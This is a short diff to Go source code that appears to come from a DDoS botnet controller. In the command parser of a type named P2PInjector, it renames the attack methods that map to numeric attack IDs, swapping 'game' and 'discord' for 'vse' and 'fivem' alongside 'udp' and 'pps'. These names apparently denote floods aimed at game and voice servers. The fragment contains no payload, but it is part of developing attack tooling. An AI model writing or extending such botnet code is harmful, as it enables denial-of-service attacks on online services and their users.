@@ -146,9 +146,9 @@ func (this *P2PInjector) ParseAndSend(cmd string) error {
 	switch method {
 	case "udp":
 		attackID = 0
-	case "game":
+	case "vse":
 		attackID = 1
-	case "discord":
+	case "fivem":
 		attackID = 2
 	case "pps":
 		attackID = 3
